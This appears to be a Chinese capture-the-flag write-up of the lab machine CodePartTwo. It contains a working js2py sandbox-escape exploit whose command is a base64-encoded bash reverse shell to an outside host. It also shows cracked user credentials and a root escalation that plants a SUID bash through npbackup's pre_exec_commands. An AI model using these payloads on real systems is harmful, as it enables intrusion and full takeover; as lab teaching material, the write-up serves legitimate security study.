# 信息收集

```
┌──(root㉿SPX-2017)-[/tmp/test]
└─# nmap --min-rate 10000 -p- 10.129.232.59
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 16:27 CST
Nmap scan report for 10.129.232.59 (10.129.232.59)
Host is up (0.19s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 10.34 seconds

┌──(root㉿SPX-2017)-[/tmp/test]
└─# nmap -sU --top-ports 20 10.129.232.59
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 16:27 CST
Nmap scan report for 10.129.232.59 (10.129.232.59)
Host is up (0.12s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open|filtered ntp
135/udp   closed        msrpc
137/udp   open|filtered netbios-ns
138/udp   closed        netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   closed        route
631/udp   open|filtered ipp
1434/udp  closed        ms-sql-m
1900/udp  open|filtered upnp
4500/udp  closed        nat-t-ike
49152/udp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 2.17 second
```
开放22 ssh和8000 http，udp留后
```
┌──(root㉿SPX-2017)-[/tmp/test]
└─# curl http://10.129.232.59:8000/
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to CodePartTwo</title>
    <!-- Google Fonts -->
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=Poppins:wght@400;500;700&display=swap">
    <link rel="stylesheet" href="/static/css/styles.css">
</head>
<body>
    <!-- Landing Section -->
    <div class="landing">
        <div class="overlay"></div>
        <div class="landing-content">
            <h1>Welcome to CodePartTwo</h1>
            <p>Empowering developers to create, code, and run their projects with ease.</p>
            <p><strong>CodePartTwo is open-source</strong>, built by developers for developers. Join us in shaping the future of collaborative coding.</p>
            <br>

                <a href="/login" class="cta-button">Login</a>
                <a href="/register" class="cta-button">Register</a>

            <br><br><a href="/download" class="cta-button">Download App</a>
        </div>
    </div>

    <!-- About Section -->
    <section class="about-section">
        <div class="container">
            <h2>About CodePartTwo</h2>
            <p>At CodePartTwo, we provide a platform designed to help developers quickly write, save, and run their JavaScript code. Whether you're working on personal projects or collaborating with a team, CodePartTwo offers the tools you need to bring your ideas to life.</p>
            <p>Our mission is to make coding accessible and efficient, giving you the power to focus on what matters most—building great software.</p>
        </div>
    </section>

    <!-- Open-Source Section -->
    <section class="open-source-section">
        <div class="container">
            <h2>Why Open Source?</h2>
            <p>We believe in the power of community-driven development. By being open-source, CodePartTwo allows developers worldwide to contribute, learn, and grow together. Explore our repository, submit your ideas, and make a difference!</p>
        </div>
    </section>

    <script src="/static/js/script.js"></script>
</body>
</html>
```
可以看到有download路由
```
┌──(root㉿SPX-2017)-[/tmp/test]
└─# curl http://10.129.232.59:8000/download --output source
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 10708 100 10708   0     0  6691     0   0:00:01  0:00:01 --:--:--  6692

┌──(root㉿SPX-2017)-[/tmp/test]
└─# ls -la
total 20
drwxr-xr-x  2 root root  4096 Dec  2 16:29 .
drwxrwxrwt 16 root root  4096 Dec  2 16:09 ..
-rw-r--r--  1 root root 10708 Dec  2 16:29 source

┌──(root㉿SPX-2017)-[/tmp/test]
└─# file source
source: Zip archive data, made by v3.0 UNIX, extract using at least v1.0, last modified Sep 01 2025 14:33:34, uncompressed size 0, method=store

┌──(root㉿SPX-2017)-[/tmp/test]
└─# mv source source.zip

┌──(root㉿SPX-2017)-[/tmp/test]
└─# unzip source.zip
```


源码文件，搜一下发现是js2py沙盒逃逸
[CVE-2024-28397](https://github.com/Ghost-Overflow/CVE-2024-28397-command-execution-poc/tree/main)

```
from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory
from flask_sqlalchemy import SQLAlchemy
import hashlib
import js2py
import os
import json

js2py.disable_pyimport()
app = Flask(__name__)
app.secret_key = 'S3cr3tK3yC0d3PartTw0'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(128), nullable=False)

class CodeSnippet(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    code = db.Column(db.Text, nullable=False)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/dashboard')
def dashboard():
    if 'user_id' in session:
        user_codes = CodeSnippet.query.filter_by(user_id=session['user_id']).all()
        return render_template('dashboard.html', codes=user_codes)
    return redirect(url_for('login'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = hashlib.md5(password.encode()).hexdigest()
        new_user = User(username=username, password_hash=password_hash)
        db.session.add(new_user)
        db.session.commit()
        return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = hashlib.md5(password.encode()).hexdigest()
        user = User.query.filter_by(username=username, password_hash=password_hash).first()
        if user:
            session['user_id'] = user.id
            session['username'] = username;
            return redirect(url_for('dashboard'))
        return "Invalid credentials"
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    return redirect(url_for('index'))

@app.route('/save_code', methods=['POST'])
def save_code():
    if 'user_id' in session:
        code = request.json.get('code')
        new_code = CodeSnippet(user_id=session['user_id'], code=code)
        db.session.add(new_code)
        db.session.commit()
        return jsonify({"message": "Code saved successfully"})
    return jsonify({"error": "User not logged in"}), 401

@app.route('/download')
def download():
    return send_from_directory(directory='/home/app/app/static/', path='app.zip', as_attachment=True)

@app.route('/delete_code/<int:code_id>', methods=['POST'])
def delete_code(code_id):
    if 'user_id' in session:
        code = CodeSnippet.query.get(code_id)
        if code and code.user_id == session['user_id']:
            db.session.delete(code)
            db.session.commit()
            return jsonify({"message": "Code deleted successfully"})
        return jsonify({"error": "Code not found"}), 404
    return jsonify({"error": "User not logged in"}), 401

@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(host='0.0.0.0', debug=True)
```
存在register路由以及login路由，还有run_code路由
`result = js2py.eval_js(code)`接受js代码执行返回结果
注册账号带上cookie可以看到dashboard路由接受js代码并提供执行
```
┌──(root㉿SPX-2017)-[/tmp/test]
└─# curl -H "Cookie: session=eyJ1c2VyX2lkIjozLCJ1c2VybmFtZSI6ImFkbWluIn0.aS6kSQ.F5slrJDAZQuZPzX2seuGo10G72c" http://10.129.232.59:8000/dashboard
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CodePartTwo Dashboard</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=Poppins:wght@400;500;700&display=swap">
    <link rel="stylesheet" href="/static/css/styles.css">
</head>
<body>
    <div class="container">
        <!-- Header -->
        <header class="header">
            <h1>Dashboard</h1>
            <p>Create, save, run, and manage your JavaScript code with CodePartTwo.</p><br>
            <a href="/logout" class="cta-button">Logout</a>
        </header>

        <!-- Code Editor Section -->
        <section class="editor-section">
            <h2>Code Editor</h2>
            <div class="editor-container">
                <textarea id="codeEditor" placeholder="var x = 16;&#10;x;"></textarea>
            </div>
            <div class="button-group">
                <button id="saveButton" class="primary-btn">Save Code</button>
                <button id="runButton" class="secondary-btn">Run Code</button>
            </div>
        </section>

        <!-- Output Section -->
        <section class="output-section">
            <h2>Output</h2>
            <div id="outputContainer" class="output-box"></div>
        </section>

        <!-- Saved Codes Section -->
        <section class="saved-codes-section">
            <h2>Saved Codes</h2>
            <ul id="codeList" class="code-list">

            </ul>
        </section>
    </div>

    <script src="/static/js/script.js"></script>
</body>
</html> 
```

**POC**
```
let cmd = "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMS8yMzMyIDA+JjEK | base64 -d | bash"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for (let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if (item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

// run the command and force UTF-8 string output
let proc = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true)
let out = proc.communicate()[0].decode("utf-8")

// return a plain string (JSON-safe)
"" + out
```
执行即可接到反弹shell
# 提权

## marco


```
app@codeparttwo:~/app/instance$ pwd
pwd
/home/app/app/instance
app@codeparttwo:~/app/instance$ file users.db
file users.db
users.db: SQLite 3.x database, last written using SQLite version 3031001
app@codeparttwo:~/app/instance$ sqlite3 users.db
sqlite3 users.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
.tables
code_snippet  user
sqlite> select * from user;
select * from user;
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
3|admin|21232f297a57a5a743894a0e4a801fc3
sqlite>
```
可以找到hash值，解密得到凭据`marco:sweetangelbabylove`

## root

marco用户可以无密码root执行npbackup-cli
```
marco@codeparttwo:~$ sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

帮助可以看到能够指定config文件，指定-b参数运行back，-f强制执行
```
  -c CONFIG_FILE, --config-file CONFIG_FILE
                        Path to alternative configuration file (defaults to current dir/npbackup.conf)

  -b, --backup          Run a backup
  -f, --force           Force running a backup regardless of existing backups age
```
家目录下可以发现conf文件，基于内容做修改
```
marco@codeparttwo:~$ cat npbackup.conf
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri:
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /home/app/app/
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password:
        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
      retention_policy: {}
      prune_max_unused: 0
    prometheus: {}
    env: {}
    is_protected: false
groups:
  default_group:
    backup_opts:
      paths: []
      source_type:
      stdin_from_command:
      stdin_filename:
      tags: []
      compression: auto
      use_fs_snapshot: true
      ignore_cloud_files: true
      one_file_system: false
      priority: low
      exclude_caches: true
      excludes_case_ignore: false
      exclude_files:
      - excludes/generic_excluded_extensions
      - excludes/generic_excludes
      - excludes/windows_excludes
      - excludes/linux_excludes
      exclude_patterns: []
      exclude_files_larger_than:
      additional_parameters:
      additional_backup_only_parameters:
      minimum_backup_size_error: 10 MiB
      pre_exec_commands: []
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: []
      post_exec_per_command_timeout: 3600
      post_exec_failure_is_fatal: false
      post_exec_execute_even_on_backup_error: true
      post_backup_housekeeping_percent_chance: 0
      post_backup_housekeeping_interval: 0
    repo_opts:
      repo_password:
      repo_password_command:
      minimum_backup_age: 1440
      upload_speed: 800 Mib
      download_speed: 0 Mib
      backend_connections: 0
      retention_policy:
        last: 3
        hourly: 72
        daily: 30
        weekly: 4
        monthly: 12
        yearly: 3
        tags: []
        keep_within: true
        group_by_host: true
        group_by_tags: true
        group_by_paths: false
        ntp_server:
      prune_max_unused: 0 B
      prune_max_repack_size:
    prometheus:
      backup_job: ${MACHINE_ID}
      group: ${MACHINE_GROUP}
    env:
      env_variables: {}
      encrypted_env_variables: {}
    is_protected: false
identity:
  machine_id: ${HOSTNAME}__blw0
  machine_group:
global_prometheus:
  metrics: false
  instance: ${MACHINE_ID}
  destination:
  http_username:
  http_password:
  additional_labels: {}
  no_cert_verify: false
global_options:
  auto_upgrade: false
  auto_upgrade_percent_chance: 5
  auto_upgrade_interval: 15
  auto_upgrade_server_url:
  auto_upgrade_server_username:
  auto_upgrade_server_password:
  auto_upgrade_host_identity: ${MACHINE_ID}
  auto_upgrade_group: ${MACHINE_GROUP}
```
重点关注`pre_exec_commands: []`等执行外部命令的参数，修改为
`pre_exec_commands: [cp /bin/bash /tmp/rootbash;chmod +s /tmp/rootbash]`
加上强制执行，避免备份时间间隔短取消执行
```
marco@codeparttwo:~$ vim /tmp/npbackup.conf
marco@codeparttwo:~$ cd /tmp/
marco@codeparttwo:/tmp$ sudo npbackup-cli -b -c npbackup.conf --force
2025-12-02 08:46:40,177 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-12-02 08:46:40,199 :: INFO :: Loaded config 058A6D05 in /tmp/npbackup.conf
2025-12-02 08:46:40,208 :: INFO :: Running backup of ['/home/app/app/'] to repo default
2025-12-02 08:46:40,270 :: INFO :: Pre-execution of command cp /bin/bash /tmp/rootbash;chmod +s /tmp/rootbash succeeded with:
None
2025-12-02 08:46:41,719 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excluded_extensions
2025-12-02 08:46:41,720 :: ERROR :: Exclude file 'excludes/generic_excluded_extensions' not found
2025-12-02 08:46:41,720 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excludes
2025-12-02 08:46:41,720 :: ERROR :: Exclude file 'excludes/generic_excludes' not found
2025-12-02 08:46:41,721 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/windows_excludes
2025-12-02 08:46:41,721 :: ERROR :: Exclude file 'excludes/windows_excludes' not found
2025-12-02 08:46:41,721 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/linux_excludes
2025-12-02 08:46:41,721 :: ERROR :: Exclude file 'excludes/linux_excludes' not found
2025-12-02 08:46:41,722 :: WARNING :: Parameter --use-fs-snapshot was given, which is only compatible with Windows
no parent snapshot found, will read all files

Files:          12 new,     0 changed,     0 unmodified
Dirs:            9 new,     0 changed,     0 unmodified
Added to the repository: 50.053 KiB (20.069 KiB stored)

processed 12 files, 48.965 KiB in 0:00
snapshot e4c0088e saved
2025-12-02 08:46:42,889 :: INFO :: Backend finished with success
2025-12-02 08:46:42,892 :: INFO :: Processed 49.0 KiB of data
2025-12-02 08:46:42,892 :: ERROR :: Backup is smaller than configured minmium backup size
2025-12-02 08:46:42,892 :: ERROR :: Operation finished with failure
2025-12-02 08:46:42,893 :: INFO :: Runner took 2.685816 seconds for backup
2025-12-02 08:46:42,894 :: INFO :: Operation finished
2025-12-02 08:46:42,903 :: INFO :: ExecTime = 0:00:02.728008, finished, state is: errors.


marco@codeparttwo:/tmp$ ./rootbash -p
rootbash-5.0# id
uid=1000(marco) gid=1000(marco) euid=0(root) egid=0(root) groups=0(root),1000(marco),1003(backups)
```

